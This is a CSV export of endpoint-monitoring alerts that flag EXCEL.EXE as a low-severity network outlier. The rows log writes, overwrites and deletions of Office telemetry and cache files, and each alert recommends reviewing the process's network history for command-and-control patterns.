"Jun 1, 2026 @ 14:24:14.303",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\Personalization\UserFacts\b1c53643363b744d_LiveId\Insights.json.tmp,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-EFCF3074
"Jun 1, 2026 @ 14:24:14.289",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\Floodgate\Excel.CampaignStates.json,,overwrite,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-68A24FE9
"Jun 1, 2026 @ 14:24:14.222",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\Floodgate\Excel.GovernedChannelStates.json,,overwrite,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-C08DD410
"Jun 1, 2026 @ 14:24:14.209",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\Floodgate\Excel.SurveyHistoryStats.json,,overwrite,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-6ACF4934
"Jun 1, 2026 @ 14:24:14.201",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\Floodgate\Excel.CampaignStates.json,,overwrite,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-5D8CE782
"Jun 1, 2026 @ 14:24:14.176",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\Floodgate\Excel.SurveyEventActivityStats.json,,overwrite,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-70359A9C
"Jun 1, 2026 @ 14:24:14.167",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\Floodgate\Excel.Settings.json,,overwrite,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-682D6DAA
"Jun 1, 2026 @ 14:24:13.221",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,173.10.254.170,52.110.14.189,,,,disconnect_received,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-F58CF98C
"Jun 1, 2026 @ 14:24:16.680",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Temp\{C9880DC3-0C78-49B5-A3CF-253D3893D90D} - OProcSessId.dat,,deletion,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-782617D4
"Jun 1, 2026 @ 14:24:13.783",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Windows\INetCache\Content.MSO\4C7883CC.xlsx,,deletion,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-9C58E879
